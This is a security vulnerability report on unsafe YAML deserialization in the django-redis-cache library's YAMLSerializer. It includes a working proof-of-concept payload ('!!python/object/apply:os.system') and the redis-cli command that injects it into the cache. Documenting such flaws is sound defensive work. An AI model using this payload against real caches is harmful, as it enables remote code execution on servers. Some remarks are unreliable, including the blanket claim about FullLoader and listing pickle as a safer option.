### Vulnerability List

- Vulnerability Name: Unsafe Deserialization with YAMLSerializer
- Description:
    1. An attacker finds a way to inject data into the Redis cache. This could be through a separate vulnerability in the application using `django-redis-cache` or if the Redis instance is exposed and not properly secured.
    2. The attacker crafts a malicious YAML payload designed to execute arbitrary code upon deserialization. A sample payload could be: `!!python/object/apply:os.system ["touch /tmp/pwned"]`.
    3. The attacker sets a cache key in Redis with this malicious YAML payload as the value, for example using `redis-cli` command `SET malicious_key '!!python/object/apply:os.system ["touch /tmp/pwned"]'`.
    4. The Django application, configured to use `redis_cache.RedisCache` with `YAMLSerializer`, attempts to retrieve and deserialize this cache key using `cache.get('malicious_key')`.
    5. The `YAMLSerializer`'s `deserialize` method in `redis_cache/serializers.py` uses `yaml.load(value, Loader=yaml.FullLoader)`. `yaml.FullLoader` is known to be unsafe and vulnerable to arbitrary code execution. When processing the malicious YAML payload, arbitrary code execution occurs on the server.
- Impact: Arbitrary code execution on the server. An attacker can gain full control of the server, potentially leading to data breaches, service disruption, and further malicious activities.
- Vulnerability Rank: Critical
- Currently implemented mitigations: None. The `django-redis-cache` project provides the `YAMLSerializer` option without any specific warnings about its unsafe nature when handling potentially untrusted data.
- Missing mitigations:
    - Remove or strongly discourage the use of `YAMLSerializer` with `yaml.FullLoader` due to its inherent unsafe deserialization properties.
    - If `YAMLSerializer` is to be kept, switch to using `yaml.SafeLoader` which is safer but has limited functionality. Alternatively, provide a very clear and prominent warning in the documentation about the severe security risks associated with using `YAMLSerializer` and `yaml.FullLoader`, especially when the Redis cache might store data that could be influenced by external actors.
    - Recommend and promote the use of safer serializers by default, such as `JSONSerializer` or `PickleSerializer` (while still noting the risks of `pickle` with untrusted input).
- Preconditions:
    1. A Django application is using `django-redis-cache`.
    2. The Django application's cache configuration is set to use `YAMLSerializer` (i.e., `OPTIONS: {'SERIALIZER_CLASS': 'redis_cache.serializers.YAMLSerializer'}`).
    3. An attacker is able to inject data into the Redis cache. This could arise from various scenarios, such as:
        - A separate vulnerability in the Django application that allows cache poisoning.
        - An improperly secured Redis instance that is accessible to the attacker.
        - Internal application logic that inadvertently stores attacker-influenced data in the cache.
- Source Code Analysis:
    - File: `/code/redis_cache/serializers.py`
    - Class: `YAMLSerializer`
    - Method: `deserialize(self, value)`
    ```python
    class YAMLSerializer(BaseSerializer):
        def serialize(self, value):
            return yaml.dump(value, encoding='utf-8', Dumper=yaml.Dumper)

        def deserialize(self, value):
            return yaml.load(value, Loader=yaml.FullLoader)
    ```
    - The `deserialize` method utilizes `yaml.load(value, Loader=yaml.FullLoader)`. The use of `yaml.FullLoader` makes the deserialization process vulnerable to arbitrary code execution if the `value` originates from or is influenced by an untrusted source. Although in typical cache usage, data is serialized and deserialized within the application's control, scenarios where an attacker can inject data into the cache create a critical security vulnerability when `YAMLSerializer` is employed.

- Security Test Case:
    1. Set up a Django project and install the `django-redis-cache` library.
    2. Configure the Django cache settings in `settings.py` to use `redis_cache.RedisCache` with `YAMLSerializer`:
    ```python
    CACHES = {
        'default': {
            'BACKEND': 'redis_cache.RedisCache',
            'LOCATION': '127.0.0.1:6381', # Or your Redis server location
            'OPTIONS': {
                'SERIALIZER_CLASS': 'redis_cache.serializers.YAMLSerializer'
            },
        }
    }
    ```
    3. Create a Django view in `tests/views.py` (or any suitable app) to retrieve and deserialize a cache key:
    ```python
    from django.core.cache import caches
    from django.http import HttpResponse

    def vulnerable_view(request):
        cache = caches['default']
        key = 'yaml_injection_test_key'
        value_from_cache = cache.get(key)
        return HttpResponse(f"Attempted deserialization. Check server for side effects.")
    ```
    4. Add a URL pattern for this view in `tests/urls.py` (or your app's urls.py):
    ```python
    from django.urls import path
    from . import views

    urlpatterns = [
        path('vulnerable_yaml_view/', views.vulnerable_view, name='vulnerable_yaml_view'),
    ]
    ```
    5. Inject a malicious YAML payload into the Redis cache using `redis-cli`:
    ```bash
    redis-cli -p 6381 # Adjust port if necessary
    SET yaml_injection_test_key '!!python/object/apply:os.system ["touch /tmp/pwned_by_yaml_deserialize"]'
    ```
    6. Access the vulnerable view in a web browser or using `curl`: `http://your_django_host/vulnerable_yaml_view/`.
    7. Check if the file `/tmp/pwned_by_yaml_deserialize` has been created on the server. Successful creation of this file indicates arbitrary code execution due to unsafe YAML deserialization, confirming the vulnerability.